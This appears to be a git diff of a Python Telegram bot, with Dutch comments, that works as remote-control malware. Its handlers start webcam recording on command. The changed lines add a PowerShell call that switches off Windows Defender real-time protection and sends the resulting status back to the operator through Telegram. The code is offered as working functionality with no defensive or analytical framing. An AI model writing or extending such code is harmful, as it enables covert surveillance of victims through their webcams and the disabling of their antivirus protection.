@@ -20,7 +20,7 @@ async def no_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 # webcam recording maken
-async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat recording begonnen is
     await context.bot.send_message(chat_id=update.effective_chat.id, text="Webcam opname is begonnen...")
 
@@ -33,9 +33,10 @@ async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 # Windows defender uitzetten
-async def stop_defender(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat Windows defender uit is
-    commandOutput = end_defender('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
+    powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
+    commandOutput = powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
 # Log errors
